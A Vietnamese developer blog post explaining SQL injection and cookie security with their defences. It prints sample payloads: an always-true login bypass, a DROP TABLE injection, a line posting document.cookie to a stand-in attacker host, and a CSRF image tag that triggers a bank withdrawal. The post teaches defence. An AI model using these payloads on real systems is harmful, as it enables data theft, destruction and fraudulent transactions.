# Giới thiệu
Bảo mật luôn là một vấn đề phức tạp và tốn kém, là trách nhiệm của rất nhiều bên bao gồm cả developer. Là developer cần phải có trách nhiệm với code mình viết ra, không chỉ để ứng dụng hoạt động được mà còn cần bảo về hệ thống bảo vệ người dùng chính vì thế trách nhiệm của developer là phải đảm bảo code mình viết ra sẽ **không có lỗi bảo mật**. Hôm nay mình xin giới thiệu một vài lỗ hổng bảo mật thường thấy khi code và cách vá lỗi.

# SQL Injection - lỗ hổng bảo mật thần thánh
Đầu tiên chúng ta sẽ cùng tìm hiểu về SQL Injection - một trong những lỗ hổng bảo mật phổ biến và nguy hiểm nhất. 
## SQL Injection là gì?
SQL Injection là kiểu tấn công bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username, password, remote execution, dump data và lấy root của SQL server. (wow)

Và công cụ để thực hiện nó vô cùng đơn giản đó là một trình duyệt web bất kì như Internet Explorer chẳng hạn :smile:

Và thực hiện tấn công ngay trên các trang web submit dữ liệu như: login, search, ....

## Tấn công SQL Injection như nào?
Cơ chế SQL Injection vô cùng đơn giản. Ta thường sử dụng câu lệnh SQL để truy cập dữ liệu ngay trên các trang submit dữ liệu. Nói lí thuyết nhiều khó hiểu và khó nhớ nên chúng ta sẽ thử vài ví dụ:

**Tấn công bằng mệnh đề luôn đúng**

Ví dụ với xử lí vô cùng quen thuộc sau:

```
SELECT * FROM users WHERE userName = '{$userName}'
```
Và kẻ tấn công thay vì nhập username bình thường lại nhập thêm đằng sau là : `' OR '1' = '1'`, thì khi truy vấn câu lệnh của chúng ta sẽ trở thành mệnh đề luôn đúng
```
SELECT * FROM users WHERE userName = '{$userName}' OR '1' = '1'
```
Và khi đó truy vấn của chúng ta trở thành mệnh đề luôn đúng và toàn bộ thông tin về user sẽ hiển thị ra.

**Tấn công phá hoại trực tiếp dữ liệu**

Vẫn là câu xử lí trên nhưng thay vì nhập '1' = '1' mà thêm như sau:
```
SELECT * FROM users WHERE userName = '{$userName}'; DROP TABLE users; ''
```

Rồi xong -_- Vậy là bảng users của mình đã bị drop sạch dữ liệu. haiz

![](https://images.viblo.asia/67f2417d-9704-449f-bdad-230c1455a9c1.jpg)

## Cách phòng chống SQL Injection
Đọc phần trên xong thì thấy SQL Injection có vẻ rất nguy hiểm đáng sợ nhưng cũng rất may là nó cũng dễ phòng chống

Có một số cách phòng chống như sau:

**Sử dụng ORM**: Gần đây, hầu như chúng ta ít viết SQL thuần mà toàn sử dụng ORM (Object-Relational Mapping) framework. Các framework web này sẽ tự tạo câu lệnh SQL nên hacker cũng khó tấn công hơn.

**Lọc dữ liệu từ người dùng**: Sử dụng filter để lọc các kí tự đặc biệt (; ” ‘) hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. 

**Không cộng chuỗi để tạo SQL**: Sử dụng parameter thay vì cộng chuỗi. Nếu dữ liệu truyền vào không hợp pháp, SQL Engine sẽ tự động báo lỗi, ta không cần dùng code để check.

**Không hiển thị exception, message lỗi**: Hacker dựa vào message lỗi để tìm ra cấu trúc database. Khi có lỗi, ta chỉ hiện thông báo lỗi chứ đừng hiển thị đầy đủ thông tin về lỗi, tránh hacker lợi dụng.

**Phân quyền rõ ràng trong DB**: Nếu chỉ truy cập dữ liệu từ một số bảng, hãy tạo một account trong DB, gán quyền truy cập cho account đó chứ đừng dùng account root hay sa. Lúc này, dù hacker có inject được sql cũng không thể đọc dữ liệu từ các bảng chính, sửa hay xoá dữ liệu.

**Backup dữ liệu thường xuyên**: Dữ liệu phải thường xuyên được backup để nếu có bị hacker xoá thì ta vẫn có thể khôi phục được.


Thật sự thì database là một phần vô cùng quan trọng của 1 ứng dụng giờ thì chúng ta hãy kiểm tra lại project mình đã làm để xem có lỗi không và fix ngay còn kịp :smile:

-------------
#  Lưu trữ cookie
![](https://images.viblo.asia/0d9cc0f5-b3ef-491b-880d-5baef6bb95ba.jpeg)
Cookie là một khái niệm cơ bản mà ai cũng biết nhưng nếu không hiểu rõ và sử dụng sai cách sẽ trở thành mồi ngon cho hacker chiếm quyền người dùng, tấn công hệ thống, ...

## Cookie là gì?
Tuy là khái niệm cơ bản nhưng trước hết cứ tìm hiểu xem cookie là gì đã nào.

Cookie là một file text nhỏ được sinh ra bởi server khi người dùng gửi request lần đầu đến server, sau đó server gửi lại về client, được lưu trữ trong browser của người dùng. Ở các request tiếp theo gửi tới server, nó sẽ gửi kèm file cookie, server dựa vào file cookie này để nhận ra người dùng.

Cookie thường có name, value, domain, expiration:

* Name, value: Tên cookie và giá trị của cookie đó
* Domain: Domain mà cookie được gửi lên
* Expiration: Thời gian cookie tồn tại ở máy client. Quá thời gian này cookie sẽ bị xóa.

## Lỗi bảo mật mà cookie có thể gây ra
Vì cookie được gửi kèm theo mỗi request lên server để giúp server nhận dạng người dùng, vậy nghĩa là nếu mình có thể lấy trộm được cookie thì sẽ có thể mạo danh người dùng.

Vậy làm thế nào để **trộm cookie**?

Có 2 con đường để có thể trộm cookie:

* Sniff cookie qua mạng: Sử dụng 1 số tool đơn giản để sniff như Fiddler, Wireshark, ta có thể chôm cookie của người dùng ở cùng mạng. Sau đó, sử dụng EditThisCookie để dump cookie này vào trình duyệt để mạo danh người dùng. 
* Chôm cookie (Cookie thief) bằng XSS: Với lỗ hỗng XSS, hacker có thể chạy mã độc (JavaScript) ở phía người dùng. JS có thể đọc giá trị từ cookie với hàm document.cookie. Hacker có thể gửi cookie này tới server của mình. Cookie này sẽ được dùng để mạo danh người dùng.

    Đọc cookie bằng JS: `console.log(document.cookie)`
    
    Gửi cookie tới hacker server: `$.post('http://abc.com/hack, document.cookie')`
    
* Thực hiện tấn công kiểu CSRF (Cross-site request forgery): Hacker post một link ảnh: `<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
`
 Trình duyệt sẽ tự động load link trong ảnh, dĩ nhiên là có kèm theo cookie. Đường link trong ảnh sẽ đọc cookie từ request, xác nhận người dùng, rút sạch tiền mà người dùng không hề hay biết. haizz
 
##  Phòng chống lỗi bảo mật do cookie gây ra

Cũng giống như SQL Injection tìm ra lỗi rồi thì phải tìm cách chống lỗi thôi. Để phòng chống các lỗi do cookie gây ra có các cách sau:

* **Set Expired và Max-Age**: Để giảm thiểu thiệt hại khi cookie bị trộm, ta không nên để cookie sống quá lâu.
* **Sử dụng Flag HTTP Only**: Cookie có flag này sẽ không thể truy cập thông qua hàm document.cookie. Do đó, dù web có bị lỗi XSS thì hacker không thể đánh cắp được nó.
* **Sử dụng Flag Secure**: Cookie có flag này chỉ được gửi qua giao thức HTTPS, hacker sẽ không thể sniff được.
* Vì cookie dễ bị tấn công, tuyệt đối **không chứa những thông tin quan trọng trong cookie** (Mật khẩu, số tài khoản, …). Nếu bắt buộc phải lưu thì cần mã hoá cẩn thận.

--------------------

Bài viết giờ có vẻ dài rồi nên những lỗ hổng tiếp theo như XSS, CSRF,.. mình sẽ viết ở bài tiếp theo ạ. Xin chào và cảm ơn bạn đã đọc (love)

Tham khảo: https://toidicodedao.com/2016/11/15/lo-hong-sql-injection-than-thanh/